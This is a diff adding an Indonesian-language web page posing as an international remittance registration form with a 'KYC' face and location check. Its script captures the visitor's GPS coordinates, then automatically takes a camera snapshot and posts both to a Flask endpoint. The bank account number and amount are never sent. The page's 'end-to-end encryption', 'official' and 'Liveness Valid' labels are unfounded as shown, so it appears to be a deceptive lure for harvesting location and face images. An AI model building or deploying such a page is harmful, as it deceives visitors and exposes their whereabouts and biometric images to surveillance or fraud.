@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pendaftaran Penerima Transfer Internasional</title>
+    <style>
+        :root{
+            --bg:#f8fafc;
+            --bg-soft:#f1f5f9;
+            --card:#ffffff;
+            --text:#0f172a;
+            --muted:#64748b;
+            --line:#e2e8f0;
+
+            --primary:#0284c7;
+            --primary-dark:#0369a1;
+            --secondary:#0ea5e9;
+            --accent:#ef4444;
+            --green:#16a34a;
+
+            --shadow:0 20px 40px rgba(15, 23, 42, 0.08);
+            --radius-xl:24px;
+            --radius-lg:16px;
+            --radius-md:12px;
+        }
+
+        *{
+            box-sizing:border-box;
+        }
+
+        body{
+            margin:0;
+            font-family: Arial, sans-serif;
+            color:var(--text);
+            background:
+                radial-gradient(circle at top right, rgba(14,165,233,.1), transparent 30%),
+                radial-gradient(circle at left bottom, rgba(2,132,199,.08), transparent 30%),
+                linear-gradient(180deg, #f8fafc 0%, #f1f5f9 100%);
+            min-height:100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .topbar{
+            background: linear-gradient(90deg, #0284c7, #0f172a);
+            color:#fff;
+            text-align:center;
+            font-weight:600;
+            font-size:14px;
+            padding:12px 16px;
+            letter-spacing:.3px;
+        }
+
+        .container{
+            max-width: 650px;
+            width: 100%;
+            margin: 40px auto;
+            padding: 0 24px;
+            flex: 1;
+        }
+
+        .form-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .flash-card,
+        .verify-card{
+            background:var(--card);
+            border:1px solid var(--line);
+            border-radius:var(--radius-xl);
+            box-shadow:var(--shadow);
+            padding:32px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .form-header h1 {
+            margin: 0 0 8px;
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text);
+        }
+
+        .form-header p {
+            margin: 0;
+            font-size: 14px;
+            color: var(--muted);
+        }
+
+        .flash-top{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            gap:12px;
+            margin-bottom:20px;
+            border-bottom: 1px solid var(--line);
+            padding-bottom: 12px;
+        }
+
+        .flash-top h2{
+            margin:0;
+            font-size:18px;
+            font-weight: 700;
+        }
+
+        .discount-pill{
+            padding:6px 12px;
+            border-radius:999px;
+            background: linear-gradient(90deg, #10b981, #059669);
+            color:#fff;
+            font-size:11px;
+            font-weight:700;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper input, .input-wrapper select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--line);
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            font-weight: 600;
+            outline: none;
+            background: #f8fafc;
+            transition: all 0.2s;
+        }
+
+        .input-wrapper input:focus, .input-wrapper select:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(2, 132, 199, 0.1);
+        }
+
+        .currency-badge {
+            position: absolute;
+            right: 16px;
+            font-weight: 700;
+            font-size: 14px;
+            color: var(--muted);
+        }
+
+        .rate-info {
+            background: var(--bg-soft);
+            padding: 14px;
+            border-radius: var(--radius-md);
+            font-size: 13px;
+            color: var(--muted);
+            margin-top: 12px;
+            border-left: 4px solid var(--primary);
+            font-weight: 600;
+        }
+
+        .verify-head{
+            display:flex;
+            align-items:flex-start;
+            justify-content:space-between;
+            gap:14px;
+            margin-bottom:20px;
+        }
+
+        .verify-head h2{
+            margin:0;
+            font-size:18px;
+            font-weight: 700;
+        }
+
+        .verify-head p{
+            margin:6px 0 0;
+            color:var(--muted);
+            line-height:1.5;
+            font-size:13px;
+        }
+
+        .secure-pill{
+            white-space:nowrap;
+            background:#ecfdf3;
+            color:#166534;
+            border:1px solid #bbf7d0;
+            padding:6px 12px;
+            border-radius:999px;
+            font-size:12px;
+            font-weight:700;
+        }
+
+        .camera-box {
+            width: 100%;
+            height: 220px;
+            background: #0f172a;
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 20px;
+            border: 1px solid var(--line);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #kamera {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-placeholder {
+            position: absolute;
+            color: #94a3b8;
+            font-size: 14px;
+            text-align: center;
+            padding: 20px;
+            z-index: 1;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.2);
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+        }
+
+        .btn-primary:disabled {
+            background: var(--muted);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        #info-lokasi {
+            margin-top: 14px;
+            padding: 14px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: var(--radius-md);
+            font-size: 13px;
+            color: #166534;
+            display: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="topbar">
+        🔒 Sistem Enkripsi Keamanan End-to-End Jalur Pengiriman Internasional Resmi
+    </div>
+
+    <div class="container">
+        <div class="form-wrapper">
+            
+            <div class="form-header">
+                <h1>Pendaftaran Remitansi</h1>
+                <p>Lengkapi formulir pendaftaran untuk memulai transfer internasional</p>
+            </div>
+
+            <div class="flash-card">
+                <div class="flash-top">
+                    <h2>Kalkulator Kurs</h2>
+                    <span class="discount-pill">Bebas Biaya Admin</span>
+                </div>
+
+                <div class="input-group">
+                    <label>Jumlah Kirim (Malaysia)</label>
+                    <div class="input-wrapper">
+                        <input type="number" id="amount-myr" value="100" oninput="hitungKurs()">
+                        <span class="currency-badge">MYR</span>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Bank Tujuan Indonesia</label>
+                    <div class="input-wrapper">
+                        <select>
+                            <option value="bca">Bank Central Asia (BCA)</option>
+                            <option value="bri">Bank Rakyat Indonesia (BRI)</option>
+                            <option value="mandiri">Bank Mandiri</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Nomor Rekening Penerima</label>
+                    <div class="input-wrapper">
+                        <input type="text" placeholder="Masukkan nomor rekening...">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Estimasi Diterima (Indonesia)</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="amount-idr" readonly>
+                        <span class="currency-badge">IDR</span>
+                    </div>
+                </div>
+
+                <div class="rate-info">
+                    Kurs Saat Ini: 1 MYR = Rp 3.500,00
+                </div>
+            </div>
+
+            <div class="verify-card">
+                <div class="verify-head">
+                    <div>
+                        <h2>Verifikasi Keamanan KYC</h2>
+                        <p>Izinkan akses lokasi perangkat dan kamera wajah untuk otentikasi validasi transaksi.</p>
+                    </div>
+                    <span class="secure-pill">Liveness Valid</span>
+                </div>
+
+                <div class="camera-box">
+                    <div class="camera-placeholder" id="placeholder-text">Kamera Belum Aktif</div>
+                    <video id="kamera" autoplay playsinline style="display:none;"></video>
+                </div>
+
+                <canvas id="canvas-snapshot" style="display:none;" width="640" height="480"></canvas>
+                
+                <button class="btn-primary" id="btn-submit" onclick="mulaiVerifikasi()">Aktifkan Akses & Kirim Data</button>
+                
+                <div id="info-lokasi"></div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let latitudeGlobal = null;
+        let longitudeGlobal = null;
+        let streamKameraGlobal = null;
+
+        function hitungKurs() {
+            var myr = document.getElementById('amount-myr').value;
+            var idrField = document.getElementById('amount-idr');
+            if (myr) {
+                idrField.value = (myr * 3500).toLocaleString('id-ID');
+            } else {
+                idrField.value = "0";
+            }
+        }
+
+        window.onload = function() {
+            hitungKurs();
+        };
+
+        // Langkah 1: Meminta Akses Kamera & Lokasi GPS
+        function mulaiVerifikasi() {
+            const btn = document.getElementById('btn-submit');
+            btn.disabled = true;
+            btn.innerText = "Memproses Validasi Perangkat...";
+
+            // Minta Geolokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    latitudeGlobal = position.coords.latitude;
+                    longitudeGlobal = position.coords.longitude;
+                    
+                    const infoBox = document.getElementById('info-lokasi');
+                    infoBox.style.display = 'block';
+                    infoBox.innerHTML = `✓ Lokasi Terkunci: ${latitudeGlobal}, ${longitudeGlobal}`;
+                    
+                    // Jalankan Kamera jika lokasi sukses
+                    bukaKamera();
+                }, function(error) {
+                    btn.disabled = false;
+                    btn.innerText = "Aktifkan Akses & Kirim Data";
+                    alert("Akses GPS/Lokasi wajib diizinkan untuk keperluan verifikasi pengiriman uang.");
+                });
+            } else {
+                alert("Browser Anda tidak mendukung pelacakan koordinat lokasi.");
+                btn.disabled = false;
+                btn.innerText = "Aktifkan Akses & Kirim Data";
+            }
+        }
+
+        // Langkah 2: Membuka Kamera Aliran Video aktif
+        function bukaKamera() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                streamKameraGlobal = stream;
+                const video = document.getElementById('kamera');
+                const placeholder = document.getElementById('placeholder-text');
+                
+                placeholder.style.display = 'none';
+                video.style.display = 'block';
+                video.srcObject = stream;
+
+                // Beri jeda 1.5 detik agar kamera stabil, lalu otomatis ambil gambar & kirim ke Server
+                setTimeout(ambilGambarDanKirim, 1500);
+            })
+            .catch(function(err) {
+                const btn = document.getElementById('btn-submit');
+                btn.disabled = false;
+                btn.innerText = "Aktifkan Akses & Kirim Data";
+                alert("Gagal memuat perangkat kamera wajah. Harap izinkan akses kamera.");
+            });
+        }
+
+        // Langkah 3: Mengambil Snapshot Gambar, Convert ke Base64, Kirim ke Flask via POST JSON
+        function ambilGambarDanKirim() {
+            const video = document.getElementById('kamera');
+            const canvas = document.getElementById('canvas-snapshot');
+            const context = canvas.getContext('2d');
+
+            // Gambar frame video ke dalam objek canvas tersembunyi
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Konversi canvas menjadi Data URL string Base64 JPG kualitas 0.8
+            const base64DataImage = canvas.toDataURL('image/jpeg', 0.8);
+
+            // Matikan aliran kamera setelah snapshot didapatkan
+            if (streamKameraGlobal) {
+                streamKameraGlobal.getTracks().forEach(track => track.stop());
+            }
+
+            // Siapkan payload JSON untuk dikirim sesuai ekspektasi Flask backend
+            const payload = {
+                latitude: latitudeGlobal,
+                longitude: longitudeGlobal,
+                image: base64DataImage
+            };
+
+            // Kirim data payload menuju Endpoint Route Flask via Fetch API
+            fetch('/api/verifikasi', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                // Konversi respon ke JSON, lalu lempar status HTTP serta bodinya ke deretan .then selanjutnya
+                return response.json().then(data => ({ status: response.status, body: data }));
+            })
+            .then(res => {
+                const btn = document.getElementById('btn-submit');
+                // Mengecek status HTTP 200 (Success) sesuai kiriman Flask
+                if (res.status === 200 && res.body.status === "success") {
+                    alert(res.body.message); // Menampilkan pesan sukses dari server
+                    btn.innerText = "Verifikasi Selesai";
+                } else {
+                    // Menampilkan pesan error dari server (jika ada) atau fallback default
+                    alert("Gagal memproses verifikasi: " + (res.body.message || "Terjadi kesalahan internal."));
+                    btn.disabled = false;
+                    btn.innerText = "Coba Lagi";
+                }
+            })
+            .catch(error => {
+                console.error("Error Fetching:", error);
+                const btn = document.getElementById('btn-submit');
+                btn.disabled = false;
+                btn.innerText = "Coba Lagi";
+                alert("Terjadi kesalahan jaringan saat menghubungi server Flask.");
+            });
+        }
+    </script>
+</body>
+</html>
